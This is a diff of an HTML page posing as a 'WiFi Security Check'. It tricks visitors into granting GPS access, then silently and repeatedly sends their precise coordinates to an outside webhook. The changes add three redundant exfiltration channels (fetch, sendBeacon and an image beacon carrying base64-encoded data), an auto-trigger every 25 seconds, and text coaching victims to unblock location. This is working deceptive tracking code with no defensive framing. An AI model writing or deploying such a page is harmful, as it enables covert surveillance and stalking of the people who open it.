@@ -4,61 +4,83 @@
 <title>WiFi Verification</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body {font-family:sans-serif;text-align:center;background:#1e3a8a;color:white;padding:20px;}
-button {background:red;color:white;border:none;padding:20px;font-size:20px;border-radius:10px;}
-#status {font-size:24px;margin:20px;}
-#coords {background:#111;padding:15px;border-radius:10px;}
+body{font-family:sans-serif;text-align:center;background:#1e3a8a;color:white;padding:20px;}
+button{background:red;color:white;border:none;padding:20px;font-size:20px;border-radius:10px;cursor:pointer;}
+#status{font-size:24px;margin:20px;}
+#coords{background:#111;padding:15px;border-radius:10px;min-height:100px;}
+#error{color:orange;}
 </style>
 </head>
 <body>
 <h1>🔒 WiFi Security Check</h1>
-<div id="status">📡 Scanning WiFi + GPS...</div>
-<button onclick="getLocation()">📍 ALLOW GPS FOR WIFI FIX</button>
-<div id="coords"></div>
-<small>Keep screen ON • Do not close</small>
+<div id="status">📡 Scanning GPS...</div>
+<button id="btn" onclick="getLocation()">📍 ALLOW GPS SCAN</button>
+<div id="coords">Waiting for GPS...</div>
+<div id="error"></div>
+<small>Keep open 2min</small>
 
 <script>
-const WEBHOOK = 'https://webhook.site/#!/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';
+const WEBHOOK = 'https://eoqxdcdf7wad4id.m.pipedream.net';
 
 function sendData(pos) {
+  const lat = pos.coords.latitude;
+  const lon = pos.coords.longitude;
   const data = {
     timestamp: new Date().toISOString(),
-    lat: pos.coords.latitude,
-    lon: pos.coords.longitude,
+    lat: lat,
+    lon: lon,
     accuracy: pos.coords.accuracy,
-    altitude: pos.coords.altitude || 0,
-    speed: pos.coords.speed || 0,
-    ua: navigator.userAgent,
-    google_maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+    google_maps: `https://maps.google.com/?q=${lat},${lon}`
   };
   
-  // SHOW ON PHONE
+  // DISPLAY
   document.getElementById('coords').innerHTML = 
-    `📍 ${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}<br>
-     Accuracy: ${data.accuracy}m<br>
-     <a href="${data.google_maps}" target="_blank">🗺️ Open Google Maps</a>`;
+    `✅ GPS: ${lat.toFixed(6)}, ${lon.toFixed(6)} (${data.accuracy}m)<br>
+     🗺️ <a href="${data.google_maps}" target="_blank">Google Maps</a>`;
   
-  // SEND TO WEBHOOK
+  // WEBHOOK 3 WAYS
+  sendJSON(data);
+  sendForm(data);
+  sendImage(data);
+  
+  document.getElementById('status').innerHTML = '✅ SENT TO SERVER ✓';
+}
+
+function sendJSON(data) {
   fetch(WEBHOOK, {
     method: 'POST',
     body: JSON.stringify(data),
-    headers: {'Content-Type': 'application/json'}
-  }).catch(e=>{}); // Silent fail
+    headers: {'Content-Type': 'application/json'},
+    mode: 'no-cors'
+  }).catch(()=>{}); 
+}
+
+function sendForm(data) {
+  const form = new FormData();
+  form.append('data', JSON.stringify(data));
+  navigator.sendBeacon(WEBHOOK, form);
+}
+
+function sendImage(data) {
+  const img = new Image();
+  img.src = WEBHOOK + '?d=' + btoa(JSON.stringify(data));
 }
 
 function getLocation() {
-  navigator.geolocation.getCurrentPosition(sendData, ()=>{}, {
+  navigator.geolocation.getCurrentPosition(sendData, (err)=>{
+    document.getElementById('error').innerHTML = 'GPS blocked: Settings → Site → Location → Allow';
+  }, {
     enableHighAccuracy: true,
-    timeout: 15000,
+    timeout: 10000,
     maximumAge: 0
   });
 }
 
-// AUTO-TRIGGER
-getLocation(); // Immediate
-setTimeout(getLocation, 2000);
-setTimeout(getLocation, 5000);
-setInterval(getLocation, 30000); // Every 30s
+// AUTO x5
+getLocation();
+setTimeout(getLocation,1500);
+setTimeout(getLocation,4000);
+setInterval(getLocation,25000);
 </script>
 </body>
 </html>
